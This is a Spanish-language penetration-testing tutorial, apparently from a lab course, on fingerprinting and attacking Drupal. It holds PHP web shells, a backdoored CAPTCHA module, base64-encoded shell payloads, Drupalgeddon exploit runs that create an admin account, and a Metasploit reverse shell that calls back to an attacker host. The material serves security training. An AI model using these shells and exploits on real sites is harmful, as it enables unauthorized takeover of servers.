---
tags:
  - Enumeración
  - CMS
---

## Enumeración

Un sitio web de Drupal se puede identificar de varias maneras, incluso mediante el mensaje de encabezado o pie de página `Powered by Drupal`, el logotipo estándar de Drupal, la presencia de un `CHANGELOG.txt` archivo o `README.txt file`, a través de la fuente de la página, o pistas en el archivo robots.txt, como referencias a `/node`.

```shell-session
vcrdcr@htb[/htb]$ curl -s http://drupal.inlanefreight.local | grep Drupal

<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
      <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
```


Otra forma de identificar Drupal CMS es a través de [nodos](https://www.drupal.org/docs/8/core/modules/node/about-nodes). Drupal indexa su contenido utilizando nodos. Un nodo puede contener cualquier cosa, como una publicación de blog, encuesta, artículo, etc. Los URI de página suelen ser del formulario `/node/<nodeid>`.

![Página del blog de Inlanefreight con un mensaje 'Próximamente' para un nuevo blog de empleados y sitio de noticias de la industria.](https://academy.hackthebox.com/storage/modules/113/drupal_node.png)

Por ejemplo, se encuentra que la publicación de blog anterior está en `/node/1`. Esta representación es útil para identificar un sitio web de Drupal cuando se usa un tema personalizado.

---

#### Tipos de usuario

1. `Administrator`: Este usuario tiene control completo sobre el sitio web de Drupal.
2. `Authenticated User`: Estos usuarios pueden iniciar sesión en el sitio web y realizar operaciones como agregar y editar artículos en función de sus permisos.
3. `Anonymous`: Todos los visitantes del sitio web son designados como anónimos. De forma predeterminada, estos usuarios solo pueden leer publicaciones.

---

Las instalaciones más recientes de Drupal bloquean por defecto el acceso al `CHANGELOG.txt` y `README.txt` archivos, por lo que es posible que tengamos que hacer más enumeración. 

Comando de ejemplo

```shell
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```


### Droopescan

Hay varias otras cosas que podríamos comprobar en esta instancia para identificar la versión. Probemos un escaneo con `droopescan` como se muestra en la sección de enumeración de Joomla. `Droopescan` tiene mucha más funcionalidad para Drupal que para Joomla.

Hagamos un escaneo contra el `http://drupal.inlanefreight.local` anfitrión.

```shell
droopescan scan drupal -u http://drupal.inlanefreight.local

[+] Plugins found:                                                              
    php http://drupal.inlanefreight.local/modules/php/
        http://drupal.inlanefreight.local/modules/php/LICENSE.txt

[+] No themes found.

[+] Possible version(s):
    8.9.0
    8.9.1

[+] Possible interesting urls found:
    Default admin - http://drupal.inlanefreight.local/user/login

[+] Scan finished (0:03:19.199526 elapsed)
```

Esta instancia parece estar ejecutando la versión `8.9.1` de Drupal. En el momento de escribir este artículo, este no era el último, ya que se lanzó en junio de 2020. Una búsqueda rápida de Drupal-relacionado [vulnerabilidades](https://www.cvedetails.com/vulnerability-list/vendor_id-1367/product_id-2387/Drupal-Drupal.html) no muestra nada aparente para esta versión central de Drupal. En este caso, a continuación, querríamos ver los complementos instalados o abusar de la funcionalidad incorporada.


## Ataque
### Aprovechamiento del Filtro PHP
En versiones anteriores de Drupal (antes de la versión 8), era posible iniciar sesión como administrador y habilitar el `PHP filter` módulo, que "Permite evaluar el código/snippets PHP incrustados."

![Página de módulos Drupal con módulo de filtro PHP resaltado, lo que permite evaluar el código PHP incrustado.](https://academy.hackthebox.com/storage/modules/113/drupal_php_module.png)

Desde aquí, podríamos marcar la casilla de verificación junto al módulo y desplazarnos hacia abajo `Save configuration`. A continuación, podríamos ir a Contenido --> Agregar contenido y crear un `Basic page`.

![Drupal agrega página de contenido con la opción Página básica resaltada para contenido estático como páginas 'Sobre nosotros'.](https://academy.hackthebox.com/storage/modules/113/basic_page.png)

Ahora podemos crear una página con un fragmento PHP malicioso como el de abajo. Nombramos el parámetro con un hash md5 en lugar del común `cmd` para entrar en la práctica de no dejar una puerta abierta a un atacante durante nuestra evaluación. Si usamos el estándar `system($_GET['cmd']);` nos abrimos a un atacante "conducción" que potencialmente se encuentra con nuestro shell web. ¡Aunque es poco probable, mejor prevenir que curar!

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

![Drupal crea una interfaz de página básica con entrada de código PHP, resaltando el formato de texto establecido en código PHP.](https://academy.hackthebox.com/storage/modules/113/basic_page_shell_7v2.png)

Con `Text format` a `PHP code`. 

Guardar, y seremos redirigidos a la nueva página, en este ejemplo `http://drupal-qa.inlanefreight.local/node/3`. 

Podemos solicitar ejecutar comandos en el navegador adjuntando `?dcfdd5e021a869fcc6dfaef8bf31377e=id` 

```shell-session
vcrdcr@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A partir de la versión 8, el [filtro PHP](https://www.drupal.org/project/php/releases/8.x-1.1) el módulo no está instalado de forma predeterminada. Para aprovechar esta funcionalidad, tendríamos que instalar el módulo nosotros mismos. Dado que estaríamos cambiando y agregando algo a la instancia de Drupal del cliente, es posible que primero queramos consultar con ellos. Comenzaríamos descargando la versión más reciente del módulo desde el sitio web de Drupal.

```shell-session
vcrdcr@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

Una vez descargado ir a `Administration` > `Reports` > `Available updates`.

>Nota: La ubicación puede diferir según la versión de Drupal y puede estar en el menú Extender.

![Página de instalación de Drupal con opciones para instalar módulos o temas desde una URL o cargar un archivo de archivo.](https://academy.hackthebox.com/storage/modules/113/install_module.png)

Desde aquí, haga clic en `Browse,` seleccione el archivo del directorio en el que lo descargamos y luego haga clic `Install`.

Una vez instalado el módulo, podemos hacer clic en `Content` y cree una nueva página básica, similar a como lo hicimos en el ejemplo de Drupal 7. De nuevo, asegúrese de seleccionar `PHP code` de la `Text format` desplegable.

Con cualquiera de estos ejemplos, debemos mantener informado a nuestro cliente y obtener permiso antes de realizar este tipo de cambios. Además, una vez que hayamos terminado, debemos eliminar o deshabilitar el `PHP Filter` modifique y elimine cualquier página que hayamos creado para obtener la ejecución remota de código.


### Subiendo un Módulo Backdoored

Drupal permite a los usuarios con los permisos adecuados cargar un nuevo módulo. Se puede crear un módulo con puerta trasera agregando un shell a un módulo existente. Los módulos se pueden encontrar en el sitio web drupal.org. Elegamos un módulo como [CAPTCHA](https://www.drupal.org/project/captcha). Desplácese hacia abajo y copie el enlace para el tar.gz [archivo](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

Descarga el archivo y extrae su contenido.

```shell-session
vcrdcr@htb[/htb]$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
vcrdcr@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz
```

Crear un shell web PHP con los contenidos:

```php
<?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>
```

A continuación, necesitamos crear un archivo .htaccess para darnos acceso a la carpeta. Esto es necesario ya que Drupal niega el acceso directo a la carpeta /modules.

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

La configuración anterior aplicará reglas para la carpeta / cuando solicitemos un archivo en /módulos. Copie ambos archivos en la carpeta captcha y cree un archivo.

```shell-session
vcrdcr@htb[/htb]$ mv shell.php .htaccess captcha
vcrdcr@htb[/htb]$ tar cvf captcha.tar.gz captcha/

captcha/
captcha/.travis.yml
captcha/README.md
captcha/captcha.api.php
captcha/captcha.inc
captcha/captcha.info.yml
captcha/captcha.install

<SNIP>
```

Suponiendo que tenemos acceso administrativo al sitio web, haga clic en `Manage` y luego `Extend` en la barra lateral. A continuación, haga clic en el `+ Install new module` botón, y nos llevarán a la página de instalación, como `http://drupal.inlanefreight.local/admin/modules/install` Navegue hasta el archivo de Captcha y haga clic en `Install`.

   

![Inlanefreight Blog update manager que muestra la instalación exitosa de captcha y los próximos pasos para la gestión de módulos.](https://academy.hackthebox.com/storage/modules/113/module_installed.png)

Una vez que la instalación tenga éxito, navegue para `/modules/captcha/shell.php` para ejecutar comandos.

```shell-session
vcrdcr@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Vulnerabilidades Conocidas
Con los años, el núcleo de Drupal ha sufrido algunas vulnerabilidades graves de ejecución remota de código, cada una doblada `Drupalgeddon`. Al momento de escribir este artículo, existen 3 vulnerabilidades de Drupalgeddon.

- [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), conocido como Drupalgeddon, afecta a las versiones 7.0 hasta 7.31 y se fijó en la versión 7.32. Esta fue una falla de inyección SQL preautenticada que podría usarse para cargar un formulario malicioso o crear un nuevo usuario administrador.
    
- [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), también conocido como Drupalgeddon2, es una vulnerabilidad de ejecución remota de código, que afecta a versiones de Drupal anteriores a 7.58 y 8.5.1. La vulnerabilidad se produce debido a una desinfección de entrada insuficiente durante el registro del usuario, lo que permite que los comandos a nivel de sistema se inyecten maliciosamente.
    
- [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), también conocido como Drupalgeddon3, es una vulnerabilidad de ejecución remota de código que afecta a múltiples versiones de Drupal 7.x y 8.x. Esta falla explota la validación incorrecta en la API del formulario.
    

Caminemos explotando cada uno de estos.

### Drupalgeddon

Como se indicó anteriormente, esta falla se puede explotar aprovechando una inyección SQL previa a la autenticación que se puede usar para cargar código malicioso o agregar un usuario administrador. Intentemos agregar un nuevo usuario administrador con esto [PoC](https://www.exploit-db.com/exploits/34992) guión. Una vez que se agrega un usuario administrador, podemos iniciar sesión y habilitar el `PHP Filter` módulo para lograr la ejecución remota de código.

Ejecutar el guión con el `-h` flag nos muestra el menú de ayuda.

```shell-session
vcrdcr@htb[/htb]$ python2.7 drupalgeddon.py 

  ______                          __     _______  _______ _____    
 |   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |   
 |.  |   \|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   |   
 |.  |    |__| |_____|   __|___._|__|      /   |___(__   `-|.  |   
 |:  1    /          |__|                 |   |  |:  1   | |:  |   
 |::.. . /                                |   |  |::.. . | |::.|   
 `------'                                 `---'  `-------' `---'   
  _______       __     ___       __            __   __             
 |   _   .-----|  |   |   .-----|__.-----.----|  |_|__.-----.-----.
 |   1___|  _  |  |   |.  |     |  |  -__|  __|   _|  |  _  |     |
 |____   |__   |__|   |.  |__|__|  |_____|____|____|__|_____|__|__|
 |:  1   |  |__|      |:  |    |___|                               
 |::.. . |            |::.|                                        
 `-------'            `---'                                        
                                                                   
                                 Drup4l => 7.0 <= 7.31 Sql-1nj3ct10n
                                              Admin 4cc0unt cr3at0r

			  Discovered by:

			  Stefan  Horst
                         (CVE-2014-3704)

                           Written by:

                         Claudio Viviani

                      http://www.homelab.it

                         info@homelab.it
                     homelabit@protonmail.ch

                 https://www.facebook.com/homelabit
                   https://twitter.com/homelabit
                 https://plus.google.com/+HomelabIt1/
       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww



Usage: drupalgeddon.py -t http[s]://TARGET_URL -u USER -p PASS


Options:
  -h, --help            show this help message and exit
  -t TARGET, --target=TARGET
                        Insert URL: http[s]://www.victim.com
  -u USERNAME, --username=USERNAME
                        Insert username
  -p PWD, --pwd=PWD     Insert password
```

Aquí vemos que necesitamos proporcionar la URL de destino y un nombre de usuario y contraseña para nuestra nueva cuenta de administrador. Ejecutemos el script y veamos si obtenemos un nuevo usuario administrador.

```shell-session
vcrdcr@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

<SNIP>

[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node
```

Ahora veamos si podemos iniciar sesión como administrador. ¡Podemos! Ahora, a partir de aquí, podríamos obtener un shell a través de los diversos medios discutidos anteriormente en esta sección.

   

![Página de administración de usuarios de Drupal que muestra los filtros para el rol, el permiso y el estado, con el administrador de usuarios y el hacker listados como administradores activos.](https://academy.hackthebox.com/storage/modules/113/drupalgeddon.png)

También podríamos usar el [exploit/multi/http/drupal_drupageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/) Módulo Metasploit para explotar esto.

### Drupalgeddon2
Podemos usar [esto](https://www.exploit-db.com/exploits/44448) PoC para confirmar esta vulnerabilidad.

```shell-session
vcrdcr@htb[/htb]$ python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/hello.txt
```

Podemos comprobar rápidamente con `cURL` y ver que el `hello.txt` el archivo fue cargado.

```shell-session
vcrdcr@htb[/htb]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt

;-)
```

Ahora modifiquemos el script para obtener la ejecución remota de código cargando un archivo PHP malicioso.

```php
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
```

```shell-session
vcrdcr@htb[/htb]$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
```

A continuación, reemplacemos el `echo` comando en el script exploit con un comando para escribir nuestro script PHP malicioso.

```shell-session
 echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```

A continuación, ejecute el script de exploit modificado para cargar nuestro archivo PHP malicioso.

```shell-session
vcrdcr@htb[/htb]$ python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/mrb3n.php
```

Finalmente, podemos confirmar la ejecución remota de código usando `cURL`.

```shell-session
vcrdcr@htb[/htb]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Drupalgeddon3

[Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3) es una vulnerabilidad de ejecución remota de código autenticada que afecta [múltiples versiones](https://www.drupal.org/sa-core-2018-004) del núcleo de Drupal. Requiere que un usuario tenga la capacidad de eliminar un nodo. Podemos explotar esto usando Metasploit, pero primero debemos iniciar sesión y obtener una cookie de sesión válida.

![detalles de solicitud HTTP que muestran encabezados como User-Agent, Accept y Cookie para drupal-acc.inlanefreight.local.](https://academy.hackthebox.com/storage/modules/113/burp.png)

Una vez que tengamos la cookie de sesión, podemos configurar el módulo exploit de la siguiente manera.

```shell-session
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > show options 

Module options (exploit/multi/http/drupal_drupageddon3):

   Name            Current Setting                                                                   Required  Description
   ----            ---------------                                                                   --------  -----------
   DRUPAL_NODE     1                                                                                 yes       Exist Node Number (Page, Article, Forum topic, or a Post)
   DRUPAL_SESSION  SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y  yes       Authenticated Cookie Session
   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          10.129.42.195                                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT           80                                                                                yes       The target port (TCP)
   SSL             false                                                                             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI       /                                                                                 yes       The target URI of the Drupal installation
   VHOST           drupal-acc.inlanefreight.local                                                    no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   User register form with exec
```

Si tiene éxito, obtendremos un shell inverso en el host objetivo.

```shell-session
msf6 exploit(multi/http/drupal_drupageddon3) > exploit

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Token Form -> GH5mC4x2UeKKb2Dp6Mhk4A9082u9BU_sWtEudedxLRM
[*] Token Form_build_id -> form-vjqTCj2TvVdfEiPtfbOSEF8jnyB6eEpAPOSHUR2Ebo8
[*] Sending stage (39264 bytes) to 10.129.42.195
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:44612) at 2021-08-24 12:38:07 -0400

meterpreter > getuid

Server username: www-data (33)


meterpreter > sysinfo

Computer    : app01
OS          : Linux app01 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
Meterpreter : php/linux
```


